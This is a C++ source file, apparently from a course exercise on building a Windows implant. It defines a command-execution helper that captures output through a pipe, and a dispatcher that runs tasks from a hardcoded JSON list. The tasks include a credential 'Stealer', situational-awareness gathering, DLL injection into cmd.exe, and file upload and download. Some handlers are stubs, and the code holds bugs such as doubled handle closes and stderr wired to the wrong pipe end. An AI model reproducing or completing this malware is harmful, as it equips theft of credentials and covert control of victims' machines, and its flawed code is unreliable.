#include <windows.h>
#include <stdio.h>
#include <minwinbase.h>
#include "..\nlohmann\json.hpp"
#include "..\Stealer\stealer.h"
#include <iostream>
#include "..\Feiyu\Injection.h"
#include "..\Feiyu\GatherInfo.h"
#include "..\Feiyu\Dropper.h"

//#include "..\HTTPstuff.h"

using json = nlohmann::json;
#define BUF_SIZE 4096

std::string exec(char* program, char* args){
    int cmdLen = strlen(program) + strlen(args);

    LPSTR parsedCmds = (char *)malloc((cmdLen + 16) * sizeof(char));
    if (parsedCmds == NULL)
    {
        printf("Error allocating memory");
        return std::string("");
    }

    // Used these docs to understand sprintf https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2013/ybk95axf(v=vs.120)
    int j;
    j = sprintf(parsedCmds, program);
    j += sprintf(parsedCmds + j, " ");
    j += sprintf(parsedCmds + j, args);
    j += sprintf(parsedCmds + j, "\0");
    // Declare handles for StdOut
    HANDLE hStdOutRead, hStdOutWrite;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    // Prevent dead squirrels
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // TODO: Set si.dwFlags...
    // HINT Read this and look for anything that talks about handle inheritance :-)
    //  https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa

    // //your solution here!
    si.dwFlags |= STARTF_USESTDHANDLES;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;

    // TODO: ensure that the child processes can inherit our handles!
    // //your solution here!
    sa.bInheritHandle = TRUE;

    // TODO: Create a pipe  object and share the handle with a child processes
    // //your solution here!

    if (!CreatePipe(
            &hStdOutRead,
            &hStdOutWrite,
            &sa,
            0))
    {
        printf("CreatePipe Failed");
        printf("%d", GetLastError());
        return std::string("");
    }

    if (!SetHandleInformation(hStdOutRead, 0x00000001, 0))
    {
        printf("Failed to set handle information for hStdOutRead");
        return std::string("");
    }
    // TODO: Set
    // set startupinfo handles
    si.hStdInput = NULL;
    si.hStdError = hStdOutRead;
    si.hStdOutput = hStdOutWrite;

    // Create the child Processes and wait for it to terminate!
    // //your solution here!

    if (!CreateProcessA(
            NULL,
            parsedCmds,
            &sa,
            &sa,
            TRUE,
            0,
            NULL,
            NULL,
            &si,
            &pi))
    {
        printf("Failed CreateProcessA\n");
        printf("%d", GetLastError());
        return std::string("");
    }

    char *buffer = (char *)malloc(BUF_SIZE);
    DWORD totalBytesAvail;
    LPDWORD lpTotalBytesAvail = &totalBytesAvail;
    DWORD bytesRead;
    LPDWORD lpBytesRead = &bytesRead;
    DWORD exitCode;
    LPDWORD lpExitCode = &exitCode;
   
    while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT)
    {
        PeekNamedPipe(
            hStdOutRead,
            NULL,
            0,
            NULL,
            lpTotalBytesAvail,
            NULL);

        while (*lpTotalBytesAvail > 0)
        {
            ReadFile(
                hStdOutRead,
                buffer,
                BUF_SIZE,
                lpBytesRead,
                NULL);

            //printf(buffer);

            *lpTotalBytesAvail = *lpTotalBytesAvail - *lpBytesRead;
        }


    }


    // TODO: perform any cleanup necessary!
    // The parent processes no longer needs a handle to the child processes, the running thread, or the out file!
    // //your solution here!
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdOutRead);
    CloseHandle(hStdOutWrite);
    free(parsedCmds);
    return std::string(buffer);
}

int parseArgs(){
    //std::string t = {R"([{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ])"};
    json response = json::parse("[{\"command\": \"Stealer\", \"args\": \"\"},"
    " {\"command\": \"FileExec\", \"args\": \"C:\\Windows\\System32\\whoami.exe \\user\"}, "
    " {\"command\": \"SitAware\", \"args\": \"\"}, "
    " {\"command\": \"Injection\", \"args\": \"L\"cmd.exe\" \"C:\\Users\\53444\\Downloads\\Simple-DLL-Injection-master\\C++\\x64\\Release\\testlib.dll\" L\"testlib.dll\"}, "
    " {\"command\": \"FileUpload\", \"args\": \"C:\\malware\\ch0nky.txt\"}, "
    " {\"command\": \"Filedownload\", \"args\": \"LaLa.exe\"}, "
    " {\"command\": \"Fileenum\", \"args\": \"LaLa.exe\"} "
    " ]");
    printf("In parse\n");
   
    std::cout << response << '\n';
    

    
    printf("NUMTASKS : %d \n", response.size());
    
    
    for (int i =0; i < response.size(); i++){
        std::string command = response.at(i).at("command");
        std::cout << command <<"\n";
         std::string args = response.at(i).at("args");
        std::cout << args << "\n";
        json res;
        if (command.compare("Stealer") == 0){
            printf("in stealer \n");
             res = driver();
             std::cout << res;
            //perform error checking then post



        } else if (command.compare("FileExec") == 0){
            //std::string res = exec(args);
            printf("in fileexec\n");

        } else if (command.compare("SitAware") == 0) {
             res = GetAll();
             std::cout << res;

        } else if (command.compare("FileEnum") == 0){
            printf("WHERE IS THIS???\n");

        } else if (command.compare("Injection") == 0){
            printf("INJECTION\n");

        } else if (command.compare("FileUpload") == 0) {
            printf("UPLOAD\n");

        } else if (command.compare("Filedownload") == 0){
            printf("DOWNLOAD\n");
            
            
        } else {
            printf("NOOOOOOOOO none of the above\n");
        }

    }
    return 0;
    
}

int main(int argc, char* argv[]){
    printf("STARTING\n");
   // json a = new json("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
    //json test = json("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
    //std::cout << test;
    parseArgs();


}